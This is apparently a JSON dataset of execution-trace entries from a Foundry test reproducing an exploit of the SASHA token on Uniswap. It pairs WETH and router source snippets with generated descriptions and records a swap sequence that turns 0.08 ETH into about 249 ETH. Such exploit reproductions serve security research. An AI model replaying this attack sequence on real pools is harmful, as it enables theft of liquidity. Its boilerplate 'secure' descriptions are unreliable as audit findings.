[
    {
        "id": "23756",
        "args": "",
        "original_code": "    function testExploit() public {\n        vm.startPrank(attacker);\n\n        SASHAToken_AttackContract attackC = new SASHAToken_AttackContract();\n        payable(address(attackC)).transfer(0.08 ether);\n\n        attackC.attack();\n\n        // Simulate withdraw\n        attackC.withdraw();\n\n        vm.stopPrank();\n\n        console.log(\"balance: \", attacker.balance - 1 ether);\n    }\n\n",
        "description": "1. **Core functions:**  \n   The `testExploit` function is designed to simulate an attack scenario. It creates a new contract called `SASHAToken_AttackContract`, sends it a small amount of Ether (0.08 ETH), and then triggers the `attack` function within that contract. After the attack, it simulates a withdrawal of funds from the attack contract. Finally, it logs the attacker's balance after the exploit, comparing it to their initial balance (1 ETH).\n\n2. **Security mechanism:**  \n   The function uses `vm.startPrank` and `vm.stopPrank` to simulate the attacker's actions in a controlled environment, likely for testing purposes. This ensures that the attack simulation does not affect the actual blockchain state. However, there are no explicit security measures within the function itself to prevent misuse, as it is intended for testing an exploit.\n\n3. **Parameter Function:**  \n   The function does not take any parameters. It operates with predefined values, such as sending 0.08 ETH to the attack contract and comparing the attacker's balance to 1 ETH.\n\n4. **Return description:**  \n   The function does not return a value directly. Instead, it logs the attacker's balance after the exploit, which is calculated by subtracting 1 ETH from their current balance. This helps to measure the impact of the attack on the attacker's funds.\n\nIn summary, the `testExploit` function simulates an attack by creating and interacting with a malicious contract, measures the financial impact on the attacker, and logs the results for analysis. It uses testing tools to ensure the simulation is isolated and does not affect the real blockchain.",
        "return_value": "Returned"
    },
    {
        "id": "0",
        "args": "ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "1272132",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "0",
        "args": "Attacker: [0x81F48A87Ec44208c691f870b9d400D9c13111e2E]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "757128",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "3671 bytes of code"
    },
    {
        "id": "41",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "457277",
        "args": "",
        "original_code": "",
        "description": "",
        "return_value": "Returned"
    },
    {
        "id": "24420",
        "args": "Uniswap V2: Router 2: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
        "original_code": "    function approve(address guy, uint wad) public returns (bool) {\n        allowance[msg.sender][guy] = wad;\n        Approval(msg.sender, guy, wad);\n        return true;\n    }\n\n",
        "description": "1. **Core functions:**  \n   The `approve` function allows the person calling it (the `msg.sender`) to give permission to another address (`guy`) to spend a specific amount (`wad`) of their tokens. This is commonly used in token contracts to delegate spending rights to others, such as exchanges or other smart contracts.\n\n2. **Security mechanism:**  \n   The function uses the `public` modifier, meaning anyone can call it. However, it directly updates the `allowance` mapping, which tracks how much one address is allowed to spend on behalf of another. The `Approval` event is emitted to log this action, providing transparency and allowing external systems to track approvals. There are no additional security checks in this function, so it relies on the caller ensuring they are approving the correct address and amount.\n\n3. **Parameter Function:**  \n   - `guy`: This is the address of the person or contract being granted permission to spend tokens.  \n   - `wad`: This is the amount of tokens the `guy` is allowed to spend on behalf of the caller.  \n\n4. **Return description:**  \n   The function always returns `true` to indicate that the approval was successful. This is a simple confirmation and does not involve any complex calculations.  \n\n**In summary,**  \nThe `approve` function lets the caller authorize another address to spend a specific amount of their tokens. It updates the `allowance` mapping, emits an event for transparency, and returns `true` to confirm the action. While it lacks advanced security checks, it relies on the caller to ensure the parameters are correct.",
        "return_value": "true"
    },
    {
        "id": "25302",
        "args": "Uniswap V2: Router 2: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "25302",
        "args": "Uniswap V3: Router 2: [0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "23974",
        "args": "",
        "original_code": "    function deposit() public payable {\n        balanceOf[msg.sender] += msg.value;\n        Deposit(msg.sender, msg.value);\n    }\n",
        "description": "1. **Core function**:  \n   The `deposit` function allows users to send Ether (the cryptocurrency used in Ethereum) to the smart contract. When a user sends Ether, the function increases the user's balance in the contract by the amount of Ether they sent. It also records this deposit event for transparency and tracking purposes.\n\n2. **Security mechanism**:  \n   - The function uses the `payable` keyword, which ensures it can accept Ether.  \n   - It directly updates the user's balance in the contract, but there are no explicit checks or restrictions on who can call it or how much Ether can be sent.  \n   - The `Deposit` event is emitted to log the transaction, which helps in monitoring and auditing.  \n\n3. **Parameter Function**:  \n   The function does not take any explicit parameters. Instead, it relies on the `msg.value` property, which represents the amount of Ether sent by the user during the transaction.  \n\n4. **Return description**:  \n   The function does not return any value. Its primary purpose is to update the user's balance in the contract and log the deposit event.  \n\n**In summary**, the `deposit` function enables users to send Ether to the contract, updates their balance accordingly, and records the transaction for transparency. It is simple but lacks advanced security features like input validation or access control.",
        "return_value": "Returned"
    },
    {
        "id": "112613",
        "args": "70000000000000000 [7e16], 1, [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0xD1456D1b9CEb59abD4423a49D40942a9485CeEF6], SASHAToken_AttackContract: [0x36C44e078A0AF99e28909567AC2F63523466F49B], 4324324234244 [4.324e12]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "8225",
        "args": "SASHAToken_AttackContract: [0x36C44e078A0AF99e28909567AC2F63523466F49B], Uniswap V2: SASHA 21: [0xB23FC1241e1Bc1a5542a438775809d38099838fe], 70000000000000000 [7e16]",
        "original_code": "    function transferFrom(address src, address dst, uint wad)\n        public\n        returns (bool)\n    {\n        require(balanceOf[src] >= wad);\n\n        if (src != msg.sender && allowance[src][msg.sender] != uint(-1)) {\n            require(allowance[src][msg.sender] >= wad);\n            allowance[src][msg.sender] -= wad;\n        }\n\n        balanceOf[src] -= wad;\n        balanceOf[dst] += wad;\n\n        Transfer(src, dst, wad);\n\n        return true;\n    }\n}\n\n\n/*\n",
        "description": "1. Core functions:  \nThe `transferFrom` function is designed to move a specified amount of tokens (`wad`) from one address (`src`) to another address (`dst`). It ensures that the sender has enough tokens and, if the sender is not the original owner, checks that the sender has permission to transfer the tokens on behalf of the owner. After verifying these conditions, it updates the balances of both addresses and logs the transfer event.\n\n2. Security mechanism:  \nThe function uses `require` statements to enforce two key security checks:  \n- It ensures the source address (`src`) has enough tokens to transfer (`balanceOf[src] >= wad`).  \n- If the sender (`msg.sender`) is not the owner (`src`), it checks that the sender has sufficient allowance (`allowance[src][msg.sender] >= wad`) to transfer tokens on behalf of the owner. Additionally, the allowance is reduced by the transferred amount to prevent reuse.  \n\n3. Parameter Function:  \n- `src`: The address from which tokens are being transferred.  \n- `dst`: The address to which tokens are being sent.  \n- `wad`: The amount of tokens to be transferred.  \n\n4. Return description:  \nThe function returns `true` to indicate that the transfer was successful. This is a standard practice in such functions to confirm the operation completed without errors.  \n\nIn summary, the `transferFrom` function securely transfers tokens between addresses, ensuring proper authorization and balance checks, and returns `true` upon success.",
        "return_value": "true"
    },
    {
        "id": "2918",
        "args": "SASHAToken_AttackContract: [0x36C44e078A0AF99e28909567AC2F63523466F49B]",
        "original_code": "    function balanceOf(address token) private view returns (uint256) {\n        return IERC20(token).balanceOf(address(this));\n    }\n\n    /// @inheritdoc IApproveAndCall\n",
        "description": "1. Core functions:  \nThe `balanceOf` function is designed to check the balance of a specific token held by the contract itself. It interacts with an external token contract (following the ERC20 standard) to retrieve the balance of the token for the address of the current contract.\n\n2. Security mechanism:  \n- The function is marked as `private`, meaning it can only be called from within the contract itself, preventing external access.  \n- It is also marked as `view`, indicating that it does not modify the state of the blockchain, ensuring it is read-only and gas-efficient.  \n\n3. Parameter Function:  \nThe function takes one parameter, `token`, which is of type `address`. This parameter represents the address of the ERC20 token contract whose balance is being queried.  \n\n4. Return description:  \nThe function returns a `uint256` value, which represents the balance of the specified token held by the contract. It achieves this by calling the `balanceOf` function of the ERC20 token contract and passing the address of the current contract (`address(this)`) as the argument.  \n\nIn summary, the `balanceOf` function is a private, read-only utility that retrieves the balance of a specific ERC20 token held by the contract, using the token's contract address as input.",
        "return_value": "0"
    },
    {
        "id": "2504",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "62924836314811012935 [6.292e19], 128443370696019410275540367 [1.284e26], 1728200831 [1.728e9]"
    },
    {
        "id": "534",
        "args": "Uniswap V2: SASHA 21: [0xB23FC1241e1Bc1a5542a438775809d38099838fe]",
        "original_code": null,
        "description": null,
        "return_value": "62994836314811012935 [6.299e19]"
    },
    {
        "id": "87872",
        "args": "0, 142298849366578503610012 [1.422e23], SASHAToken_AttackContract: [0x36C44e078A0AF99e28909567AC2F63523466F49B], 0x",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "55097",
        "args": "SASHAToken_AttackContract: [0x36C44e078A0AF99e28909567AC2F63523466F49B], 142298849366578503610012 [1.422e23]",
        "original_code": "    function transfer(address dst, uint wad) public returns (bool) {\n        return transferFrom(msg.sender, dst, wad);\n    }\n\n    function transferFrom(address src, address dst, uint wad)\n        public\n        returns (bool)\n    {\n        require(balanceOf[src] >= wad);\n\n        if (src != msg.sender && allowance[src][msg.sender] != uint(-1)) {\n            require(allowance[src][msg.sender] >= wad);\n            allowance[src][msg.sender] -= wad;\n        }\n\n        balanceOf[src] -= wad;\n        balanceOf[dst] += wad;\n\n        Transfer(src, dst, wad);\n\n        return true;\n    }\n}\n\n\n/*\n",
        "description": "1. Core functions:  \nThe main purpose of these functions is to transfer a specified amount of tokens from one address to another. The `transfer` function is a simplified version that allows the sender to transfer tokens directly to another address. The `transferFrom` function is more flexible, enabling tokens to be transferred from one address to another, even if the sender is not the owner of the tokens, provided they have the necessary permission (allowance).\n\n2. Security mechanism:  \nThe code includes several safety checks to ensure secure token transfers. The `require` statements are used to verify that the sender has enough tokens to transfer and, if applicable, that they have the required permission (allowance) to transfer tokens on behalf of another address. The `if` condition ensures that the allowance is only checked and reduced if the sender is not the owner of the tokens. These measures prevent unauthorized or invalid transfers.\n\n3. Parameter Function:  \n- `dst` (destination): The address that will receive the tokens.  \n- `wad`: The amount of tokens to be transferred.  \n- `src` (source): The address from which the tokens are being transferred. This is only used in the `transferFrom` function, allowing tokens to be moved from an address other than the sender, provided the sender has permission.  \n\n4. Return description:  \nBoth functions return a boolean value (`true`) to indicate that the transfer was successful. If the transfer fails due to insufficient balance or allowance, the function will revert and not return any value.  \n\nIn summary, these functions facilitate secure token transfers between addresses, with built-in checks to ensure validity and authorization. The `transfer` function is straightforward, while `transferFrom` offers more flexibility for delegated transfers.",
        "return_value": "true"
    },
    {
        "id": "534",
        "args": "Uniswap V2: SASHA 21: [0xB23FC1241e1Bc1a5542a438775809d38099838fe]",
        "original_code": null,
        "description": null,
        "return_value": "62994836314811012935 [6.299e19]"
    },
    {
        "id": "918",
        "args": "Uniswap V2: SASHA 21: [0xB23FC1241e1Bc1a5542a438775809d38099838fe]",
        "original_code": null,
        "description": null,
        "return_value": "128301071846652831771930355 [1.283e26]"
    },
    {
        "id": "918",
        "args": "SASHAToken_AttackContract: [0x36C44e078A0AF99e28909567AC2F63523466F49B]",
        "original_code": null,
        "description": null,
        "return_value": "142298849366578503610012 [1.422e23]"
    },
    {
        "id": "8397",
        "args": "Uniswap V2: SASHA 21: [0xB23FC1241e1Bc1a5542a438775809d38099838fe], 1000000000000000000 [1e18]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "202796",
        "args": "ExactInputSingleParams({ tokenIn: 0xD1456D1b9CEb59abD4423a49D40942a9485CeEF6, tokenOut: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, fee: 10000 [1e4], recipient: 0x36C44e078A0AF99e28909567AC2F63523466F49B, amountIn: 99000000000000000000000 [9.9e22], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }",
        "original_code": "    function exactInputSingle(ExactInputSingleParams memory params)\n        external\n        payable\n        override\n        returns (uint256 amountOut)\n    {\n        // use amountIn == Constants.CONTRACT_BALANCE as a flag to swap the entire balance of the contract\n        bool hasAlreadyPaid;\n        if (params.amountIn == Constants.CONTRACT_BALANCE) {\n            hasAlreadyPaid = true;\n            params.amountIn = IERC20(params.tokenIn).balanceOf(address(this));\n        }\n\n        amountOut = exactInputInternal(\n            params.amountIn,\n            params.recipient,\n            params.sqrtPriceLimitX96,\n            SwapCallbackData({\n                path: abi.encodePacked(params.tokenIn, params.fee, params.tokenOut),\n                payer: hasAlreadyPaid ? address(this) : msg.sender\n            })\n        );\n        require(amountOut >= params.amountOutMinimum, 'Too little received');\n    }\n\n    /// @inheritdoc IV3SwapRouter\n",
        "description": "1. Core functions:  \nThe `exactInputSingle` function is designed to facilitate a single token swap within a decentralized exchange (DEX) environment. It allows a user to specify the exact amount of input tokens they want to swap and ensures they receive a minimum amount of output tokens in return. The function handles the logic for swapping tokens, including checking the contract's balance if the entire balance is to be swapped, and ensuring the output meets the user's specified minimum requirement.\n\n2. Security mechanism:  \n- `payable`: This modifier allows the function to accept Ether, which might be necessary for certain operations like paying gas fees.  \n- `override`: Indicates that this function overrides a function from a parent contract or interface, ensuring it adheres to the expected behavior.  \n- `require`: This is used to enforce a condition that the output amount must be greater than or equal to the user's specified minimum (`params.amountOutMinimum`). If not, the transaction is reverted with an error message ('Too little received').  \n\n3. Parameter Function:  \nThe function takes a single parameter, `params`, which is a struct containing the following fields:  \n- `amountIn`: The amount of input tokens to swap. If set to a specific flag (`Constants.CONTRACT_BALANCE`), the function will swap the entire balance of the contract.  \n- `tokenIn`: The address of the input token to be swapped.  \n- `tokenOut`: The address of the output token to be received.  \n- `fee`: The fee tier for the swap, which determines the liquidity pool to be used.  \n- `recipient`: The address that will receive the output tokens.  \n- `sqrtPriceLimitX96`: A price limit to prevent unfavorable swaps.  \n- `amountOutMinimum`: The minimum amount of output tokens the user expects to receive.  \n\n4. Return description:  \nThe function returns `amountOut`, which represents the actual amount of output tokens received from the swap. This value is calculated by the internal function `exactInputInternal`, which performs the actual swap logic. The function ensures that `amountOut` is greater than or equal to `params.amountOutMinimum`; otherwise, the transaction is reverted.  \n\nIn summary,  \nThe `exactInputSingle` function enables users to swap tokens in a decentralized exchange while ensuring they receive a minimum specified amount of output tokens. It includes security checks to protect users from unfavorable swaps and handles edge cases, such as swapping the entire contract balance. The function relies on an internal helper (`exactInputInternal`) to perform the swap and enforces conditions to safeguard user interests.",
        "return_value": "249276511929373786924 [2.492e20]"
    },
    {
        "id": "195371",
        "args": "SASHAToken_AttackContract: [0x36C44e078A0AF99e28909567AC2F63523466F49B], false, 99000000000000000000000 [9.9e22], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000004000000000000000000000000036c44e078a0af99e28909567ac2f63523466f49b000000000000000000000000000000000000000000000000000000000000002bd1456d1b9ceb59abd4423a49d40942a9485ceef6002710c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000",
        "original_code": null,
        "description": null,
        "return_value": "-249276511929373786924 [-2.492e20], 99000000000000000000000 [9.9e22]"
    },
    {
        "id": "27962",
        "args": "SASHAToken_AttackContract: [0x36C44e078A0AF99e28909567AC2F63523466F49B], 249276511929373786924 [2.492e20]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "2918",
        "args": "0x5EAc5992e8c7cC6B04bad2C5bBC00D101d4C8264",
        "original_code": null,
        "description": null,
        "return_value": "501057216497825691871 [5.01e20]"
    },
    {
        "id": "109780",
        "args": "-249276511929373786924 [-2.492e20], 99000000000000000000000 [9.9e22], 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000004000000000000000000000000036c44e078a0af99e28909567ac2f63523466f49b000000000000000000000000000000000000000000000000000000000000002bd1456d1b9ceb59abd4423a49d40942a9485ceef6002710c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "105673",
        "args": "SASHAToken_AttackContract: [0x36C44e078A0AF99e28909567AC2F63523466F49B], 0x5EAc5992e8c7cC6B04bad2C5bBC00D101d4C8264, 99000000000000000000000 [9.9e22]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "275",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]"
    },
    {
        "id": "75538",
        "args": "0, 0, [0xD1456D1b9CEb59abD4423a49D40942a9485CeEF6, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 0x81164C9eDAB507Aa4baC08dCeccEFabA1340d3b7, 1728203087 [1.728e9]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "8951",
        "args": "SASHA: [0xD1456D1b9CEb59abD4423a49D40942a9485CeEF6], Uniswap V2: SASHA 21: [0xB23FC1241e1Bc1a5542a438775809d38099838fe], 0",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "504",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "62994836314811012935 [6.299e19], 128301071846652831771930355 [1.283e26], 1728203087 [1.728e9]"
    },
    {
        "id": "918",
        "args": "Uniswap V2: SASHA 21: [0xB23FC1241e1Bc1a5542a438775809d38099838fe]",
        "original_code": null,
        "description": null,
        "return_value": "128301072846652831771930355 [1.283e26]"
    },
    {
        "id": "38721",
        "args": "489519303415 [4.895e11], 0, Uniswap V2: Router 2: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 0x",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "25162",
        "args": "Uniswap V2: Router 2: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 489519303415 [4.895e11]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "534",
        "args": "Uniswap V2: SASHA 21: [0xB23FC1241e1Bc1a5542a438775809d38099838fe]",
        "original_code": null,
        "description": null,
        "return_value": "62994835825291709520 [6.299e19]"
    },
    {
        "id": "918",
        "args": "Uniswap V2: SASHA 21: [0xB23FC1241e1Bc1a5542a438775809d38099838fe]",
        "original_code": null,
        "description": null,
        "return_value": "128301072846652831771930355 [1.283e26]"
    },
    {
        "id": "534",
        "args": "Uniswap V2: Router 2: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D]",
        "original_code": null,
        "description": null,
        "return_value": "489519303415 [4.895e11]"
    },
    {
        "id": "9223",
        "args": "489519303415 [4.895e11]",
        "original_code": "    function withdraw(uint wad) public {\n        require(balanceOf[msg.sender] >= wad);\n        balanceOf[msg.sender] -= wad;\n        msg.sender.transfer(wad);\n        Withdrawal(msg.sender, wad);\n    }\n\n",
        "description": "1. **Core functions**:  \n   This function allows a user to withdraw a specified amount of funds (referred to as `wad`) from their account. It checks if the user has enough balance, deducts the amount from their balance, and sends the funds to their address. It also logs the withdrawal event for tracking purposes.\n\n2. **Security mechanism**:  \n   - `require(balanceOf[msg.sender] >= wad)`: Ensures the user has sufficient balance before proceeding, preventing over-withdrawal.  \n   - `msg.sender.transfer(wad)`: Safely sends the specified amount to the user\u2019s address, using Solidity\u2019s built-in `transfer` function, which automatically reverts the transaction if it fails.  \n   - The function is marked as `public`, meaning it can be called by anyone, but the `require` statement ensures only valid withdrawals are processed.\n\n3. **Parameter Function**:  \n   - `uint wad`: Represents the amount of funds the user wants to withdraw. It must be a positive number and cannot exceed the user\u2019s current balance.\n\n4. **Return description**:  \n   This function does not return any value. Instead, it performs actions: it updates the user\u2019s balance, transfers the funds, and emits an event (`Withdrawal`) to record the transaction details.\n\nIn summary, this function securely handles withdrawals by ensuring users have enough balance, deducting the amount, and transferring funds safely while logging the event for transparency.",
        "return_value": "Returned"
    },
    {
        "id": "83",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "0",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "918",
        "args": "0x5EAc5992e8c7cC6B04bad2C5bBC00D101d4C8264",
        "original_code": null,
        "description": null,
        "return_value": "99501057216497825691871 [9.95e22]"
    },
    {
        "id": "9181",
        "args": "249276511929373786924 [2.492e20]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "41",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "7304",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "0",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "0",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "0",
        "args": "\"balance: \", 249206511929373786924 [2.492e20]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    }
]